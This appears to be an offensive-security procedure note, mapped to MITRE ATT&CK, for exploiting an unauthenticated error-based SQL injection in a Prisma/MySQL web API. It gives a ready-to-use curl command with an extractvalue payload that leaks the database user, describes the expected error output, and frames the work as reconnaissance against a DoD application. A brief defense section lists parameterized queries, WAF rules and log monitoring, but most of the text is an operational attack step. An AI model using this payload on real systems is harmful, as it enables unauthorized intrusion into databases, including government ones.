---
id: proc-uuid-001
name: Leak-Database-User-via-SQL-Injection
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.507Z'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - sqli
  - error-based
  - mysql
commands:
  - '[[commands/curl-leak-user]]'
platforms:
  - Web
  - MySQL
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Leak-Database-User-via-SQL-Injection

## Summary

This procedure exploits an unauthenticated SQL injection vulnerability in the /api/organizations/* endpoint to leak the current MySQL database user through an error message triggered by the extractvalue function.

## Description

The target application uses Prisma's queryRaw without input sanitization, allowing injection after a single quote in the organization ID parameter. By crafting a payload with extractvalue(rand(), concat(...)), an XPATH syntax error is induced, embedding the selected user() output in the error message. This is the initial step in schema reconnaissance for a DoD application.

## Requirements

1. Network access to the target web application (HTTPS on standard port)
2. No authentication required
3. curl or similar HTTP client
4. Knowledge of basic SQL syntax

## Defense

Defensive measures and detection strategies:

- Implement prepared statements or parameterized queries in Prisma
- Enable MySQL error logging without sensitive data exposure (e.g., suppress XPATH errors)
- Web Application Firewall (WAF) rules to block SQL keywords like 'extractvalue' or 'concat'
- Monitor for 500 errors with anomalous payloads in access logs

## Objectives

1. Confirm SQL injection vulnerability
2. Extract database user for further reconnaissance
3. Identify backend authentication context

## Instructions

### Step 1: Craft and Send Injection Payload

**Context**: The payload closes the string with a quote, injects the error-triggering SQL, and comments out the rest to leak the user.

**Command** ([[commands/curl-leak-user]]):
```bash
curl -X GET "https://target.com/api/organizations/0010jdlwix09k'or(extractvalue(rand(),concat(0x3a,(select+user()))))=1--%20aa" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Upgrade-Insecure-Requests: 1" --compressed
```

> This command sends the GET request with the injected payload. Expected output is a 500 error from Prisma: 'Invalid `prisma.queryRaw()` invocation: Raw query failed. Code: `1105`. Message: `XPATH syntax error: ':user@host@domain'`', where 'user@host@domain' reveals the DB user.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access
- [[Discovery]] Discovery

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-leak-user]]

## Tools Used


## Tags

- [[sqli]]
- [[error-based]]
- [[mysql]]
